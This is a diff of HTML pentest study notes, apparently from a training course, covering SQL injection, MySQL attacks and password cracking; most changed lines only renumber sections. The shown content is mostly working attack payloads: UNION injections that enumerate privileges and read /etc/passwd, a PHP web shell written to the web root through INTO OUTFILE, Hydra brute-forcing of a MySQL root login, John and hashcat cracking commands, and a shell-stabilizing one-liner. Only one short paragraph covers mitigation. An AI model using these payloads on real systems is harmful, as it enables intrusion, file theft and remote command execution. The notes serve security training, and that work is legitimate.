+<div class="sourceCode" id="cb87"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb87-1"><a href="#cb87-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, user(), 3, 4-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb88"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb88-1"><a href="#cb88-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, user, 3, 4 from mysql.user-- </span></span></code></pre></div>
+<h5 id="user-privileges"><span class="header-section-number">1.7.9.7.1</span> User Privileges</h5>
 <p>Now that we know our user, we need to know which privileges he
 has.</p>
-<div class="sourceCode" id="cb77"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb77-1"><a href="#cb77-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> super_priv <span class="kw">FROM</span> mysql.<span class="fu">user</span></span></code></pre></div>
-<div class="sourceCode" id="cb78"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb78-1"><a href="#cb78-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb89"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb89-1"><a href="#cb89-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> super_priv <span class="kw">FROM</span> mysql.<span class="fu">user</span></span></code></pre></div>
+<div class="sourceCode" id="cb90"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb90-1"><a href="#cb90-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- </span></span></code></pre></div>
 <p>When we have several users we can only show the privileges of the
 searched user.</p>
-<div class="sourceCode" id="cb79"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb79-1"><a href="#cb79-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;larry&quot;-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb91"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb91-1"><a href="#cb91-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;larry&quot;-- </span></span></code></pre></div>
 <p>To check other privileges then the root user privilege we can use one
 of the following command.</p>
-<div class="sourceCode" id="cb80"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb80-1"><a href="#cb80-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> sql_grants <span class="kw">FROM</span> information_schema.sql_show_grants</span></code></pre></div>
-<div class="sourceCode" id="cb81"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb81-1"><a href="#cb81-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- </span></span></code></pre></div>
-<h5 id="load_file"><span class="header-section-number">1.7.8.7.2</span>
+<div class="sourceCode" id="cb92"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb92-1"><a href="#cb92-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> sql_grants <span class="kw">FROM</span> information_schema.sql_show_grants</span></code></pre></div>
+<div class="sourceCode" id="cb93"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb93-1"><a href="#cb93-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- </span></span></code></pre></div>
+<h5 id="load_file"><span class="header-section-number">1.7.9.7.2</span>
 LOAD_FILE</h5>
 <p>If the OS user has enough privileges we can use the
 <code>LOAD_FILE()</code> function to read files from the system.</p>
-<div class="sourceCode" id="cb82"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb82-1"><a href="#cb82-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> LOAD_FILE(<span class="st">&#39;/etc/passwd&#39;</span>);</span></code></pre></div>
-<div class="sourceCode" id="cb83"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb83-1"><a href="#cb83-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- </span></span></code></pre></div>
-<div class="sourceCode" id="cb84"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb84-1"><a href="#cb84-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb94"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb94-1"><a href="#cb94-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> LOAD_FILE(<span class="st">&#39;/etc/passwd&#39;</span>);</span></code></pre></div>
+<div class="sourceCode" id="cb95"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb95-1"><a href="#cb95-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb96"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb96-1"><a href="#cb96-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4-- </span></span></code></pre></div>
 <p>To see the Code press <code>[Ctrl + U]</code>.</p>
-<h4 id="writing-files"><span class="header-section-number">1.7.8.8</span> Writing Files</h4>
+<h4 id="writing-files"><span class="header-section-number">1.7.9.8</span> Writing Files</h4>
 <p>Requirements: 1. User with <code>FILE</code> privilege enabled 2.
 MySQL global <code>secure_file_priv</code> variable not enabled 3. Write
 access to the location we want to write to on the back-end server</p>
-<h5 id="secure_file_priv"><span class="header-section-number">1.7.8.8.1</span> secure_file_priv</h5>
-<div class="sourceCode" id="cb85"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb85-1"><a href="#cb85-1" aria-hidden="true" tabindex="-1"></a>SHOW VARIABLES <span class="kw">LIKE</span> <span class="st">&#39;secure_file_priv&#39;</span>;</span></code></pre></div>
-<div class="sourceCode" id="cb86"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb86-1"><a href="#cb86-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> variable_name, variable_value <span class="kw">FROM</span> information_schema.global_variables <span class="kw">where</span> variable_name<span class="op">=</span><span class="ot">&quot;secure_file_priv&quot;</span></span></code></pre></div>
-<div class="sourceCode" id="cb87"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb87-1"><a href="#cb87-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- </span></span></code></pre></div>
-<h5 id="select-into-outfile"><span class="header-section-number">1.7.8.8.2</span> SELECT INTO OUTFILE</h5>
+<h5 id="secure_file_priv"><span class="header-section-number">1.7.9.8.1</span> secure_file_priv</h5>
+<div class="sourceCode" id="cb97"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb97-1"><a href="#cb97-1" aria-hidden="true" tabindex="-1"></a>SHOW VARIABLES <span class="kw">LIKE</span> <span class="st">&#39;secure_file_priv&#39;</span>;</span></code></pre></div>
+<div class="sourceCode" id="cb98"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb98-1"><a href="#cb98-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> variable_name, variable_value <span class="kw">FROM</span> information_schema.global_variables <span class="kw">where</span> variable_name<span class="op">=</span><span class="ot">&quot;secure_file_priv&quot;</span></span></code></pre></div>
+<div class="sourceCode" id="cb99"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb99-1"><a href="#cb99-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- </span></span></code></pre></div>
+<h5 id="select-into-outfile"><span class="header-section-number">1.7.9.8.2</span> SELECT INTO OUTFILE</h5>
 <p>Write output from a <code>SELECT</code> query into a file.</p>
-<div class="sourceCode" id="cb88"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb88-1"><a href="#cb88-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">from</span> users <span class="kw">INTO</span> OUTFILE <span class="st">&#39;/tmp/credentials&#39;</span>;</span></code></pre></div>
+<div class="sourceCode" id="cb100"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb100-1"><a href="#cb100-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">from</span> users <span class="kw">INTO</span> OUTFILE <span class="st">&#39;/tmp/credentials&#39;</span>;</span></code></pre></div>
 <p>Write any string into a file.</p>
-<div class="sourceCode" id="cb89"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb89-1"><a href="#cb89-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="st">&#39;this is a test&#39;</span> <span class="kw">INTO</span> OUTFILE <span class="st">&#39;/tmp/test.txt&#39;</span>;</span></code></pre></div>
-<h5 id="writing-files-through-sql-injection"><span class="header-section-number">1.7.8.8.3</span> Writing Files through SQL
+<div class="sourceCode" id="cb101"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb101-1"><a href="#cb101-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="st">&#39;this is a test&#39;</span> <span class="kw">INTO</span> OUTFILE <span class="st">&#39;/tmp/test.txt&#39;</span>;</span></code></pre></div>
+<h5 id="writing-files-through-sql-injection"><span class="header-section-number">1.7.9.8.3</span> Writing Files through SQL
 Injection</h5>
 <p>If we want to write a web shell we need to know the base web
 directory. One way to find it out is the <code>load_file</code> function
@@ -1190,28 +1303,28 @@ Alternatively, a fuzzing scan would still be possible with <a href="https://gith
 wordlist for Linux</a> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">this
 wordlist for Windows</a>.</p>
 <p>A <code>UNION</code> injection for poof can look like this:</p>
-<div class="sourceCode" id="cb90"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb90-1"><a href="#cb90-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; union select 1,&#39;</span>file written successfully!<span class="st">&#39;,3,4 into outfile &#39;</span><span class="op">/</span>var<span class="op">/</span>www<span class="op">/</span>html<span class="op">/</span>proof.txt<span class="st">&#39;-- </span></span></code></pre></div>
-<h5 id="writing-a-web-shell-php"><span class="header-section-number">1.7.8.8.4</span> Writing a Web Shell
+<div class="sourceCode" id="cb102"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb102-1"><a href="#cb102-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; union select 1,&#39;</span>file written successfully!<span class="st">&#39;,3,4 into outfile &#39;</span><span class="op">/</span>var<span class="op">/</span>www<span class="op">/</span>html<span class="op">/</span>proof.txt<span class="st">&#39;-- </span></span></code></pre></div>
+<h5 id="writing-a-web-shell-php"><span class="header-section-number">1.7.9.8.4</span> Writing a Web Shell
 (PHP)</h5>
-<div class="sourceCode" id="cb91"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb91-1"><a href="#cb91-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="va">$_REQUEST</span>[<span class="dv">0</span>])<span class="ot">;</span> <span class="kw">?&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb103"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb103-1"><a href="#cb103-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="va">$_REQUEST</span>[<span class="dv">0</span>])<span class="ot">;</span> <span class="kw">?&gt;</span></span></code></pre></div>
 <p>If we use the <code>PHP</code> code from above and inject it to the
 server, we should have the ability to run commands. When we got to the
 <code>/shell.php</code> file we should be able to pass commands to the
 <code>0</code> parameter with <code>?0=id</code> with the URL.</p>
-<div class="sourceCode" id="cb92"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb92-1"><a href="#cb92-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; union select &quot;&quot;,&#39;</span><span class="op">&lt;</span>?php <span class="kw">system</span>($_REQUEST[<span class="dv">0</span>]); ?<span class="op">&gt;</span><span class="st">&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;</span><span class="op">/</span>var<span class="op">/</span>www<span class="op">/</span>html<span class="op">/</span>shell.php<span class="st">&#39;-- </span></span></code></pre></div>
-<h4 id="mitigating-sql-injection"><span class="header-section-number">1.7.8.9</span> Mitigating SQL
+<div class="sourceCode" id="cb104"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb104-1"><a href="#cb104-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; union select &quot;&quot;,&#39;</span><span class="op">&lt;</span>?php <span class="kw">system</span>($_REQUEST[<span class="dv">0</span>]); ?<span class="op">&gt;</span><span class="st">&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;</span><span class="op">/</span>var<span class="op">/</span>www<span class="op">/</span>html<span class="op">/</span>shell.php<span class="st">&#39;-- </span></span></code></pre></div>
+<h4 id="mitigating-sql-injection"><span class="header-section-number">1.7.9.9</span> Mitigating SQL
 Injection</h4>
 <p>If possible restrict valid characters, give the database user the
 least required permissions, use a <code>WAF</code> and parameterized
 queries.</p>
-<h5 id="php"><span class="header-section-number">1.7.8.9.1</span>
+<h5 id="php"><span class="header-section-number">1.7.9.9.1</span>
 PHP</h5>
 <p>Use the <a href="https://www.php.net/manual/en/mysqli.real-escape-string.php">mysqli_real_escape_string()</a>or
 the <a href="https://www.php.net/manual/en/function.pg-escape-string.php">pg_escape_string()</a>
 function.</p>
 </div>
-<div id="mysql" class="slide section level3" number="1.7.9">
-<h1><span class="header-section-number">1.7.9</span> MySQL</h1>
+<div id="mysql" class="slide section level3" number="1.7.10">
+<h1><span class="header-section-number">1.7.10</span> MySQL</h1>
 <p>To ensure that we are working with a <code>MySQL</code> Server we can
 use the following commands.</p>
 <table>
@@ -1252,7 +1365,7 @@ use the following commands.</p>
 </table>
 <p>First we need a client, which is in our case
 <code>default-mysql-client</code>:</p>
-<div class="sourceCode" id="cb93"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb93-1"><a href="#cb93-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-P</span> [port] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
+<div class="sourceCode" id="cb105"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb105-1"><a href="#cb105-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-P</span> [port] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
 <pre class="text"><code>*(-h [IP]        = Connect to the MariaDB server on the given host
   -u [username]  = The MariaDB user name to use when connecting to the server
   -P [port]      = The port to use for the connection
@@ -1263,23 +1376,22 @@ use the following commands.</p>
 <li><code>SHOW TABLES;</code></li>
 <li><code>SELECT * FROM &lt;tablename&gt;;</code></li>
 </ol>
-<h4 id="cracking-credentials"><span class="header-section-number">1.7.9.1</span> Cracking Credentials</h4>
+<h4 id="cracking-credentials"><span class="header-section-number">1.7.10.1</span> Cracking Credentials</h4>
 <p>If we do not have any credentials we can use <code>Nmap</code> or
 <code>Metasplot</code> to gain this information:</p>
-<div class="sourceCode" id="cb95"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb95-1"><a href="#cb95-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap <span class="at">--script</span><span class="op">=</span>mysql-enum [target]</span></code></pre></div>
+<div class="sourceCode" id="cb107"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb107-1"><a href="#cb107-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap <span class="at">--script</span><span class="op">=</span>mysql-enum [target]</span></code></pre></div>
 <pre class="text"><code>*(--script=mysql-enum           = Scan with a single script: mysql-enum
   [target]                      = The IP address of the target)</code></pre>
 <p>Now that we know some usernames of the database, we can try to crack
 the passwords of them with <code>Hydra</code>:</p>
-<div class="sourceCode" id="cb97"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb97-1"><a href="#cb97-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
+<div class="sourceCode" id="cb109"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb109-1"><a href="#cb109-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
 <pre class="text"><code>*(-t 16     = Number of parallel connections per target
   -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
   -P [file] = Points to the file containing the list of possible passwords
   -vV       = Very verbose: shows the login+pass combination for each attempt
   [IP]      = The IP address of the target machine
   [mysql]   = Sets the protocol)</code></pre>
-<h4 id="cheat-sheets"><span class="header-section-number">1.7.9.2</span>
-Cheat Sheets</h4>
+<h4 id="cheat-sheets"><span class="header-section-number">1.7.10.2</span> Cheat Sheets</h4>
 <ul>
 <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">pentestmonkey.net</a>
 ### John the Ripper If we have a hash which look something like the
@@ -1287,15 +1399,15 @@ following example:</li>
 </ul>
 <pre><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
 <p>We can pipe the hash in a file:</p>
-<div class="sourceCode" id="cb100"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb100-1"><a href="#cb100-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb112"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb112-1"><a href="#cb112-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
 <p>And crack the password with <code>John the Ripper</code>:</p>
-<div class="sourceCode" id="cb101"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb101-1"><a href="#cb101-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
-<span id="cb101-2"><a href="#cb101-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb113"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb113-1"><a href="#cb113-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
+<span id="cb113-2"><a href="#cb113-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
 <pre class="text"><code>*(--show            = show cracked passwords
   --format=&lt;param&gt;  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt</code></pre>
 </div>
-<div id="hashcat" class="slide section level3" number="1.7.10">
-<h1><span class="header-section-number">1.7.10</span> Hashcat</h1>
+<div id="hashcat" class="slide section level3" number="1.7.11">
+<h1><span class="header-section-number">1.7.11</span> Hashcat</h1>
 <pre class="shell"><code>$ hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></pre>
 </div>
 
@@ -1440,7 +1552,7 @@ source.</p>
   [target]          = The URL of the webpage we want to fetch
   -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)</code></pre>
 <p>We can also save files with the <code>-0</code> flag:</p>
-<div class="sourceCode" id="cb124"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb124-1"><a href="#cb124-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-O</span> inlanefreight.com/index.html <span class="at">-o</span> home.html <span class="at">-s</span> <span class="at">-v</span></span></code></pre></div>
+<div class="sourceCode" id="cb136"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb136-1"><a href="#cb136-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-O</span> inlanefreight.com/index.html <span class="at">-o</span> home.html <span class="at">-s</span> <span class="at">-v</span></span></code></pre></div>
 <pre class="text"><code>*(-0    = Save the output into a file
   -o    = Sepcify the filename
   -s    = Silent the status
@@ -1484,7 +1596,7 @@ Socat</h4>
 <h4 id="stabilize-shell"><span class="header-section-number">1.8.3.3</span> Stabilize Shell</h4>
 <p>You can stabilize the shell with the python module
 <code>pty</code>:</p>
-<div class="sourceCode" id="cb131"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb131-1"><a href="#cb131-1" aria-hidden="true" tabindex="-1"></a>python <span class="op">-</span>c <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb143"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb143-1"><a href="#cb143-1" aria-hidden="true" tabindex="-1"></a>python <span class="op">-</span>c <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span></code></pre></div>
 <p>For more information checkout the following GitHub repo: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a></p>
 <p>If you gain access depending on the OS you can try the following
 commands to get more information: &gt;Linux</p>
